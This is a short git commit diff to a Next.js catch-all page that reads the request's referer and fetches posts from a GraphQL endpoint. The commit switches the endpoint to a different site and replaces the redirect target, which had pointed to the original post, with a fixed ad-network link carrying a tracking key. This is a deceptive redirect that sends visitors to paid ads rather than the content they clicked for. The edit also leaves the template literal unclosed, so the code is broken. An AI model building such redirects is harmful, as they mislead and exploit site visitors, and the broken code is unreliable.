60b89de56565b86aeeb1f2903d671fb8a28cafd1
mubashiralikhaan13 <133602196+mubashiralikhaan13@users.noreply.github.com>
2023-05-15 10:45:42 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://alcashzone.com/graphql"
+	const endpoint = "https://asiantv.wiki/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,8 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://alcashzone.com/` + encodeURI(path as string)
-				}`,
+					`https://www.highrevenuegate.com/t8n69680c?key=eb91cfd66d73e41bfc50e9864bee1f9b`
 			},
 		};
 		}
